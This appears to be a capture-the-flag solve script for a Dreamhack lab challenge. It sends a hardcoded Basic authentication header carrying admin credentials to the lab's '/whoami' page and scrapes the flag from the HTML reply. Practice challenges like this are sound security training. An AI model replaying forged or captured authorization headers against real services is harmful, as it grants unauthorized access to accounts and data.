from bs4 import BeautifulSoup
import requests

URL = "http://host3.dreamhack.games:15353"
FLAG_URI = "/whoami"

HEADERS = {"Authorization":"Basic YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY="}

resp = requests.get(url=URL+FLAG_URI, headers=HEADERS)

soup = BeautifulSoup(resp.content,"html.parser")
p_tags = soup.find_all('p')

flag = p_tags[1]

print(flag)